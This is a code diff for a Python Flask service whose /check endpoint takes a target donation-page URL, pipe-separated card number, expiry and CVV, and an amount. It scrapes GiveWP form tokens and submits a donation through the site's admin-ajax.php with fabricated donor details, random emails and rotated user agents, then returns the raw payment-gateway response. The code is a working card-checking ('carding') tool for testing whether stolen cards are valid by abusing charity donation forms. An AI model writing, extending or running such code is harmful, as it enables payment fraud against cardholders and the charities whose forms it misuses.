@@ -1,8 +1,25 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, Response
 import requests
 from bs4 import BeautifulSoup
+import random
+import time
 
 app = Flask(__name__)
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+    "Mozilla/5.0 (Linux; Android 11)",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
+]
+
+def get_headers(url):
+    return {
+        "User-Agent": random.choice(USER_AGENTS),
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": url.split("/give")[0],
+        "Referer": url
+    }
 
 @app.route("/check", methods=["GET"])
 def check():
@@ -11,43 +28,74 @@ def check():
     amount = request.args.get("amount")
 
     if not url or not card or not amount:
-        return jsonify({"result": "Error: url, card and amount required"})
+        return Response("Missing params", status=400)
 
     try:
+        number, month, year, cvv = card.split("|")
+
         session = requests.Session()
 
-        # 1️⃣ فتح صفحة التبرع
-        page = session.get(url, timeout=10).text
+        headers = get_headers(url)
 
-        # 2️⃣ استخراج tokens باستخدام BeautifulSoup
-        soup = BeautifulSoup(page, "html.parser")
-        form_id_tag = soup.find("input", {"name": "give-form-id"})
-        form_hash_tag = soup.find("input", {"name": "give-form-hash"})
+        # 🔁 retry بسيط
+        for attempt in range(2):
+            try:
+                # 1️⃣ فتح الصفحة
+                page = session.get(url, headers=headers, timeout=15)
 
-        if not form_id_tag or not form_hash_tag:
-            return jsonify({"result": "Error: tokens not found"})
+                soup = BeautifulSoup(page.text, "html.parser")
 
-        form_id = form_id_tag.get("value")
-        form_hash = form_hash_tag.get("value")
+                form_id = soup.find("input", {"name": "give-form-id"}).get("value")
+                form_hash = soup.find("input", {"name": "give-form-hash"}).get("value")
 
-        # 3️⃣ تجهيز بيانات الدفع
-        payload = {
-            "action": "give_process_donation",
-            "give-form-id": form_id,
-            "give-form-hash": form_hash,
-            "give-amount": amount,
-            "card": card
-        }
+                # 2️⃣ بيانات dynamic
+                email = f"user{random.randint(1000,9999)}@mail.com"
 
-        # 4️⃣ إرسال POST request للبوابة
-        ajax_url = url.split("/give")[0] + "/wp-admin/admin-ajax.php"
-        resp = session.post(ajax_url, data=payload, timeout=10)
+                payload = {
+                    "action": "give_process_donation",
+                    "give-form-id": form_id,
+                    "give-form-hash": form_hash,
+                    "give-amount": amount,
 
-        # 5️⃣ رجع الرد كما هو من البوابة
-        return jsonify({"result": resp.text})
+                    "give_first": "John",
+                    "give_last": "Doe",
+                    "give_email": email,
+
+                    "give_address_1": "Street 1",
+                    "give_city": "NY",
+                    "give_state": "NY",
+                    "give_zip": "10001",
+                    "give_country": "US",
+
+                    "card_number": number,
+                    "card_exp_month": month,
+                    "card_exp_year": year,
+                    "card_cvc": cvv
+                }
+
+                ajax_url = url.split("/give")[0] + "/wp-admin/admin-ajax.php"
+
+                resp = session.post(
+                    ajax_url,
+                    data=payload,
+                    headers=headers,
+                    timeout=15
+                )
+
+                # 🔥 رجّع الرد الخام
+                return Response(
+                    resp.text,
+                    content_type=resp.headers.get("Content-Type", "text/plain")
+                )
+
+            except Exception:
+                time.sleep(1)
+
+        return Response("Request failed after retry", status=500)
 
     except Exception as e:
-        return jsonify({"result": f"Error: {str(e)}"})
+        return Response(str(e), status=500)
+
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
